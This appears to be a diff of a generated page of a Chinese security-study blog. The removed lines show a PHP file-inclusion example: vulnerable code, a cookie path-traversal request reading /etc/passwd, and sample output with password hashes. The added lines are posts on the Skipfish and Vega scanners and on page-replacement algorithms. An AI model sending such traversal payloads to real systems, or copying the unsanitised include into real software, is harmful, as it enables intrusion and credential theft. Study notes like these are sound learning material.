-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    if($file!=&quot;include.php&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ERROR:File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
-<li>代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = &apos;blue.php&apos;</span><br><span class="line">if( is_set($_COOKIE[&apos;TEMPLATE&apos;]))</span><br><span class="line">    $template = $_COOKIE[&apos;TEMPLATE&apos;]</span><br><span class="line">include (&quot;/home/users/phpguru/template/&quot;.$template)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>攻击</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable.php HTTP/1.0</span><br><span class="line">Cookie:TEMPLATE=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>结果</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content=Type:text/html</span><br><span class="line">Server:Apache</span><br><span class="line"></span><br><span class="line">root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh</span><br><span class="line">daemon:*:1:1::/tmp:</span><br><span class="line">phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3137,11 +2360,816 @@ Test Links In URLs（Bookmark Test）：只测试连接
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B9%9D)%EF%BC%9ASkipfish/" itemprop="url">Kali Linux笔记(三十九)：Skipfish</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
+                2019-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  427 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-skipfish"><a href="#1-skipfish" class="headerlink" title="1. skipfish"></a>1. skipfish</h4><ul>
+<li>C语言编写（Google开发）</li>
+<li>实验性的主动web安全评估工具（相比于商业扫描器不遑相让）</li>
+<li>基于Web Application进行扫描</li>
+<li>递归爬网</li>
+<li>基于字典的探测</li>
+<li>速度较快<ul>
+<li>多路单线程，全异步网络I/O，消除内存管理和调度开销</li>
+<li>启发式自动内容识别</li>
+</ul>
+</li>
+<li>误报较低</li>
+</ul>
+<h4 id="2-skipfish"><a href="#2-skipfish" class="headerlink" title="2. skipfish"></a>2. skipfish</h4><ul>
+<li><strong><code>🔺命令：skipfish -o（存放工作目录） test http://1.1.1.1</code></strong></li>
+<li><strong><code>🔺命令：skipfish -o test @url.txt</code></strong></li>
+<li><strong><code>🔺命令：skipfish -o test -S（指定只读字典）complet.wl -W（写成新的字典） a.wl http://1.1.1.1  #字典</code></strong></li>
+<li>参数<ul>
+<li>-I：只检查包含’string’的URL</li>
+<li>-X：不检查包含’string’的URL  #logout</li>
+<li>-K：不对指定参数进行Fuzz测试</li>
+<li>-D：跨站点爬取另外一个域（有连接则会跳过去爬取 ）</li>
+<li>-l：每秒最大请求数</li>
+<li>-m：每IP最大并发连接数</li>
+<li>–config：指定配置文件</li>
+</ul>
+</li>
+<li>身份认证（http认证）<ul>
+<li><strong><code>🔺命令：skipfish -A（http身份认证信息） user:pass -o test http://1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>身份认证（Cookie认证）    <ul>
+<li><strong><code>🔺命令：skipfish -C（Cookie信息）&quot;name=var&quot; -o test http://1.1.1.1</code></strong></li>
+</ul>
+</li>
+<li>身份认证参数（表单认证） <ul>
+<li>–auth-form <URL> </li>
+<li>–auth-user-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
+<li>–auth-user <username> （提交表单的用户名）</li>
+<li>–auth-pass-field &lt;表单代码名&gt; （通过form里面的代码名）</li>
+<li>–auth-pass <password>  （提交表单的密码）</li>
+<li>–auth-verify-url <URL> （提交成功后显示的界面）</li>
+<li>–auth-form-target <URL>（通过form里面的action确定）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>表单代码名可通过查看界面源代码元素去获得，查看表单设置的属性</code></pre></blockquote>
+<ul>
+<li>扫描结束太快<ul>
+<li>触发了目标站点的连接数限制，降低-m -l数值</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AB)%EF%BC%9AVega/" itemprop="url">Kali Linux笔记(三十八)：Vega</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
+                2019-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  539 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-vega（纯界面化）"><a href="#1-vega（纯界面化）" class="headerlink" title="1. vega（纯界面化）"></a>1. vega（纯界面化）</h4><ul>
+<li><p>Kali 2.0以上无此软件，需要下载： <a href="https://subgraph.com/vega/download/index.en.html" target="_blank" rel="noopener">https://subgraph.com/vega/download/index.en.html</a></p>
+<blockquote>
+<pre><code>▲ 2019.12.24软件需要java 8 openjdk
+▲ 2019.12.24在Windows安装运行成功
+▲ 2019.12.24在Kali上运行报错</code></pre></blockquote>
+</li>
+<li><p>JAVA编写的开源Web扫描器</p>
+</li>
+<li><p>扫描模式</p>
+</li>
+<li><p>代理模式</p>
+</li>
+<li><p>爬站、处理表单、注入测试</p>
+</li>
+<li><p>支持SSL：<a href="http://vega/ca.crt（在代理模式下进行访问）" target="_blank" rel="noopener">http://vega/ca.crt（在代理模式下进行访问）</a></p>
+</li>
+</ul>
+<blockquote>
+<pre><code>代理模式：
+Web Client → Proxy Server（可截断修改） → Web Server
+
+▲ 代理服务器，一般用于手动漏洞挖掘，可代替客户端进行扫描
+
+爬站：
+主动扫描阶段：刚开始的手动提交少提交有攻击性代码的内容
+代理扫描阶段：通过字典以及代理服务器发送大量请求进行爬站（Fuzz）
+
+vega比较集中关注Web Application方面的漏洞，比较少关注软件，Web Server方面的漏洞，相对比较集中在程序员编写代码方面的漏洞</code></pre></blockquote>
+<h4 id="2-vega基本参数配置"><a href="#2-vega基本参数配置" class="headerlink" title="2. vega基本参数配置"></a>2. vega基本参数配置</h4><ul>
+<li>Window → Preferences → General<ul>
+<li>SOCKS proxy/External HTTP proxy</li>
+<li>General → Appearance（界面显示方式，默认）</li>
+<li>General → Updates（自动更新，默认）</li>
+</ul>
+</li>
+<li>Window → Preferences → Proxy（vega自提供代理）<ul>
+<li>Default User-Agent（默认，可删除vega标识）</li>
+<li>Override client User-Agent（默认）</li>
+<li>Prevent browser caching（访问服务器每次发送新的请求，默认）</li>
+<li>Prevent Intermediate（proxy）caching（阻止代理缓存，默认）</li>
+<li>Listener（vega本机监听网络地址，提供多个代理给局域网）</li>
+</ul>
+</li>
+<li>Window → Preferences → Scanner<ul>
+<li>Debug → Log all scanner requests（记录扫描记录，默认）</li>
+<li>Debug → Display debug output in console（显示详细扫描信息，默认）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ vega最主要的是，vega自带的代理（IP地址:端口）
+▲ 无论是Proxy还是Scanner，都需要设置Target，Target Scope：Base Paths/Exclude（URL or pattern）
+▲ autoproxt设置vega代理模式：IP：端口</code></pre></blockquote>
+<h4 id="3-vega使用"><a href="#3-vega使用" class="headerlink" title="3. vega使用"></a>3. vega使用</h4><ul>
+<li>Proxy（Target Scope）</li>
+<li>Scanner（Target Scope+Cookie）</li>
+<li>Intercept（vega支持很不友好，可能存在bug）</li>
+</ul>
+<blockquote>
+<pre><code>vega是自签名证书，可能会存在别方的地址劫持（别的地方的自签名证书），可以在官方上下载Vega的自签名证书，然后安装到浏览器上
+火狐查看证书信息：右键 → View Page Info → Security → View Certificate
+
+▲ 证书颁发是给域名的，不是给IP地址的</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/24/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/24/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/" itemprop="url">第三章、页面置换算法</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-24T16:36:19+08:00">
+                2019-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Operating-System/" itemprop="url" rel="index">
+                    <span itemprop="name">Operating System</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.9k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="第三章、页面置换算法"><a href="#第三章、页面置换算法" class="headerlink" title="第三章、页面置换算法"></a>第三章、页面置换算法</h2><hr>
+<ol>
+<li><p>最优页面置换算法（OPT）</p>
+<ul>
+<li>基本思想：当一个缺页中断发生时，对于保存在内存当中的每一个逻辑页面，计算在它的下一次访问之前，还需等待多长时间，从中选择等待时间最长的那个，作为被置换的页面</li>
+<li>这只是一种理想情况。在实际系统中是无法实现的，因为操作系统无从知道每一个页面要等待多长时间以后才会再次访问</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 可用作其他算法的性能评价的依据（在一个模拟器上运行某个程序，并记录每一次的页面访问情况，在第二遍运行时即可使用最优算法）</code></pre></blockquote>
+<ol start="2">
+<li><p>先进先出算法（First-in-First-out，FIFO）</p>
+<ul>
+<li>基础思想：选择在内存中驻留时间最长的时间的页面并淘汰之。具体来说，系统维护着一个链表，记录了所有位于内存当中的逻辑页面。从链表的排列顺序来看，链首页面驻留的时间最长，链尾页面驻留时间最短。当发生一个缺页中断时，把链首页面淘汰出局，并把新的页面添加到链表的末尾</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 性能较差，调出的页面有可能时经常要访问的页面，并且有Belady现象。FIFO算法很少单独使用</code></pre></blockquote>
+<ol start="3">
+<li><p>最近最久未使用算法（Least Recently Used，LRU）</p>
+<ul>
+<li>基本思路：当一个缺页中断发生时，选择最久未使用的那个页面，并淘汰</li>
+<li>两种实现方式：<ul>
+<li>系统维护一个页面链表，最近刚刚使用过地页面作为首终点，最久未使用地页面作为尾结点。每一次访问内存时，找到相应地页面，把它从链表中摘下来，再移动到链表之首。每次缺页中断发生时，淘汰链表末尾地页面</li>
+<li>设置一个活动页面栈，当访问某页时，将此页号压入栈顶，然后，考察栈内是否有此页面相同地页号，若有则抽出。当需要淘汰一个页面时，总是选择栈底的底面，它就是最久未使用的</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 它是对最优页面置换算法的一个近似，其依据是程序的局部性原理，即在最近一小段时间（最近几条指令）内，如果某些页面被频繁地访问，那么在将来地一小段时间内，它们还可能会再一次被频繁地访问。反过来说，如果在过去某些页面长时间未被访问，那么在将来它们还可能会长时间地得不到访问</code></pre></blockquote>
+<ol start="4">
+<li><p>时钟页面置换算法（硬件实现访问位置0/1）(Reigsident bit，used bit，frame number)</p>
+<ul>
+<li>Clock页面置换算法，LRU的近似，用一个bit来模拟，贴近最优的LRU，对FIFO的一种改进</li>
+<li>基本思路：<ul>
+<li>需要用到页表项当中的访问位，当一个页面被装入内存时，把该位初始化为0。然后如果这个页面被访问（读/写），则把该位置为1</li>
+<li>把各个页面组织成环形链表（类似钟表面），把指针指向最老的页面（最先进来）</li>
+<li>当发生一个缺页中断时，考察指针所指向的最老页面，若它的访问位为0，立即淘汰；若访问位为1，则把该位置为0，然后指针往下移动一格。如此下去，直到找到被淘汰的页面，然后把指针移动到它的下一格</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 维持一个环形页面链表保存在内存中
+1.用一个时钟（或者使用/引用）位来标记一个页面是否经常被访问
+2.当一个页面被引用的时候，这个位被设置（为1）
+
+▲ 时钟头扫遍页面寻找一个带有user bit=0
+替换在一个周转内没有被引用的页面</code></pre></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func Clock_Replacement</span><br><span class="line">begin </span><br><span class="line">while  (victim page not found)  do</span><br><span class="line">    if  (used bit for current page=0)   then</span><br><span class="line">            replace current page(&amp;set used bit to 1)</span><br><span class="line">    else</span><br><span class="line">            reset used bit(to 0)</span><br><span class="line">   end if</span><br><span class="line">   advance clock pointer</span><br><span class="line">end while end Clock_Replacement</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><p>二次机会法（Reigsident bit，used bit，dirty bit）</p>
+<ul>
+<li>这里有一个巨大的代价来替代”脏页“</li>
+<li>修改Clock算法，使它允许脏页总是在一次时钟头扫描中保留下来</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>Before clock sweep                 After clock sweep
+used    dirty                         used    dirty   
+0          0                          replace page
+0          1                          0          0
+1          0                          0          0
+1          1                          0          1
+▲ 注释：同时使用脏位和使用位来指导置换</code></pre></blockquote>
+<ol start="6">
+<li><p>最不常用算法（Least Frequently Used，LFU）</p>
+<ul>
+<li>基本思想：当一个缺页中断发生时，选择访问次数最少的那个页面，并淘汰之</li>
+<li>实现方法：对每个页面设置一个访问计算器，每当一个页面被访问时，该页面的访问计算器加1。在发生缺页中断时，淘汰计数值最小的那个页面。</li>
+<li>LRU和LFU的区别：<ul>
+<li>LRU考察的时多久未访问，时间越短越好</li>
+<li>LFU考察的时访问次数或频度，访问次数越多越好</li>
+</ul>
+</li>
+<li>问题：一个页面在进程开始时使用得很多，但以后就不使用了。实现也费时费力<ul>
+<li>解决方法：定期把次数寄存器右移一位</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ Belady现象、FIFO、LRU和Clock的比较
+1.Belady现象：在采用FIFO算法时，有时会出现分配的物理页面数增加，缺页率反而提高的异常现象
+2.Belady现象的原因：FIFO算法的置换特征与进程访问内存的动态特征是矛盾的，与置换算法的目标是不一致的（即替换较少使用的页面），因此，被它置换出去的页面并不一定是进程不会访问的
+3.LRU、FIFO和Clock的比较
+(1)LRU算法和FIFO本质上都是先进先出的思路，只不过LRU是针对页面的最近访问时间来进行排序，所以需要在每一次页面访问的时候动态地调整各个页面之后的先后顺序（有一个页面的最近访问时间变了）；而FIFO是针对页面进入内存的时间来进行排序，这个时间是固定不变的，所以各页面之间的先后顺序是固定的。如果一个页面在进入内存后没有被访问，那么它的最近访问时间就是它进入内存的时间。换句话说，如果内存当中的所有页面都未曾访问，那么LRU算法退化为FIFO算法
+(2)LRU算法性能较好，但系统开销较大；FIFO算法系统开销较小，但可能会发生Belady现象。因此，折衷的办法就是Clock算法，在每一次页面访问时，它不必去动态地调整该页面在链表当中的顺序，而仅仅是做一个标记，然后等到发生缺页中断的时候，再把它移动到链表末尾。对于内存当中那些未被访问的页面，Clock算法的表先和LRU算法一样好；而对于那些曾经被访问的页面，它不能像LRU算法那样，记住它们的精确位置</code></pre></blockquote>
+<ol start="7">
+<li><p>工作集</p>
+<ul>
+<li>工作集：一个进程当前正在使用的逻辑页面集合，可以用一个二元函数W（t，▲）来表示<ul>
+<li>t是当前的执行时刻</li>
+<li>▲称为工作集窗口（working-set window），即一个定长的页面访问的时间窗口</li>
+<li>W（t，▲）=当前时刻t之前的▲时间窗口当中所有页面所组成的集合（随着t的变化，该集合也在不断地变化）</li>
+<li>|W（t，▲）|指工作集地的大小，即页面数目</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 工作集大小的变化：进程开始执行后，随着访问新页面逐步建立稳定的工作集。当内存访问的局部性区域的位置大致稳定时，工作集大小也大致稳定；局部性区域的位置改变时，工作集快速扩张和收缩过渡到下一个稳定值</code></pre></blockquote>
+<ol start="8">
+<li><p>常驻集</p>
+<ul>
+<li>常驻集是指在当前时刻，进程实际驻留在内存当中的页面集合<ul>
+<li>工作集是进程在运行过程中固有的性质，而常驻及取决于系统分配给进程的物理页面数目，以及所采用的页面置换算法；</li>
+<li>如果一个进程的整个工作集都在内存当中，即常驻集被包含于工作集，那么进程将很顺利地运行，而不会造成太多地缺页中断（直到工作集发生剧烈变动，从而过渡到另一个状态</li>
+<li>当进程常驻集的大小达到某个数目之后，再给它分配更多的物理页面，缺页率也不会明显下降</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>工作集页置换算法</p>
+<ul>
+<li>超出工作集就替换掉</li>
+</ul>
+</li>
+<li><p>缺页率页面置换算法</p>
+<ul>
+<li>可变分配策略：常驻集大小可变。例如：每个进程在刚开始运行的时候，先根据程序大小给它分配一定数目的物理页面，然后再进程运行过程中，再动态地调整常驻集的大小<ul>
+<li>可采用全局页面置换的方式，当发生一个缺页中断时，被置换的页面可以是在其他进程当中，各个并发进程竞争地使用物理页面</li>
+<li>优缺点：性能较好，但增加了系统开销</li>
+<li>具体实现：可以使用缺页率算法（PFF page of fault frequency）来动态调整常驻集的大小</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 缺页率：表示“缺页次数/内存访问次数”（比率）或“缺页的评级时间间隔的倒数”。</code></pre></blockquote>
+<ul>
+<li>影响缺页率的因素：<ul>
+<li>页面置换算法</li>
+<li>分配给进程的物理页面算法</li>
+<li>页面本身的大小</li>
+<li>程序的编写方法</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 一个交替的工作集计算明确的视图最小化页缺失
+1.当缺页率高的时候------增加工作集
+2.当缺页率低的时候------减少工作集</code></pre></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">算法：</span><br><span class="line">     保持追踪缺失发生概率</span><br><span class="line">          1.当缺失发生时，从上次页缺失起计算这个时间记录这个使劲按，t（last）是上次的页缺失的时间</span><br><span class="line">          2.如果发生页缺失之间的时间是“大”，之后减少工作集</span><br><span class="line">          3.如果t（current）-t（last）&gt;T,之后从内存中移除所有在【t（last），t（current）】时间内没有被引用的页</span><br><span class="line">          4.如果这个发生页缺失的时间是“小”，之后增加工作集</span><br><span class="line">          5.如果t（current）-t（last）&lt;=T，之后增加缺失页到工作集中</span><br></pre></td></tr></table></figure>
+
+<ol start="11">
+<li><p>抖动问题（thrashing）</p>
+<ul>
+<li>如果分配给一个进程的物理页面太少，不能包含整个的工作集，集常驻集被包含于工作集，那么进程将会造成很多的缺页中断，需要频繁地在内存与外存之间替换页面，从而使进程的运行速度变得很慢，我们把这种状态称为“抖动”</li>
+<li>产生的原因：随着驻留内存的进程数目增加，分配给每个进程的物理页面数不断减小，缺页率不断上升。所以OS要选择一个适当的进程数目和进程需要的帧数，以便在并发水平和缺页率之间达到一个平衡</li>
+<li>抖动问题可能会被本地的页面置换改善<ul>
+<li>更好的规则为加载控制：调整MPL，所以：Better criteria for load control：Adjust MPL so that：</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>▲ 平均缺页时间（MTBF）=页缺失服务时间（PFST）</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/9/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/7/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/9/">Next</a>
   </nav>
 
 
@@ -3191,7 +3219,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">123</span>
+                  <span class="site-state-item-count">120</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3298,7 +3326,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">109.6k</span>
+    <span title="Site words total count">105.2k</span>
   
 </div>
 
